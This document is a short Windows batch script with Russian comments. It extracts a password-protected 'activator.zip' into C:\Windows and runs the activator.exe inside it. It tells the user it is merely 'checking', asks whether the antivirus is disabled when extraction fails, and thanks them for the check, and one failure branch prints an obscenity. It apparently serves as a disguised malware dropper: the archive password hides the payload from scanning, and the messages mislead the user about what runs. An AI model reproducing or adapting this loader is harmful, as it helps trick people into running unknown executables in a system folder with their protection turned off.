@echo off
chcp 65001
Color 4
cls
setlocal

REM === Настройка параметров ===
set "zip_file=C:\ProgramData\activator.zip"   REM Путь к ZIP-архиву
set "output_dir=C:\Windows"  REM Папка для распакованных файлов
set "password=123" REM Пароль к архиву
set "sevenzip_path=C:\ProgramData\7z.exe" REM Путь к 7-Zip
set "target_file=activator.exe"   REM Имя файла для запуска

REM === Проверка наличия 7-Zip ===
if not exist "%sevenzip_path%" (
  echo 7-Zip не найден в указанном пути: "%sevenzip_path%".
  echo Пожалуйста, установите 7-Zip.
  pause
  exit /b 1
)

REM === Создание папки для распаковки ===
if not exist "%output_dir%" (
  md "%output_dir%"
)

REM === Распаковка архива ===
echo Проверка...
"%sevenzip_path%" x "%zip_file%" -o"%output_dir%" -p"%password%" >nul
cls
if %errorlevel% equ 0 (
    echo Допроверка.
) else (
    echo Произошла ошибка при проверке.
    echo Выключен ли антивирус?
    pause
    exit /b 1
)

REM === Запуск целевого файла ===
set "target_file_path=%output_dir%\%target_file%"
if exist "%target_file_path%" (
    echo Отлично! Спасибо за проверку.
    start "" "%target_file_path%"
) else (
    echo ПИЗДЕЦЦЦ.
    echo ПИЗДЕЦЦЦ.
)

endlocal
pause
exit /b 0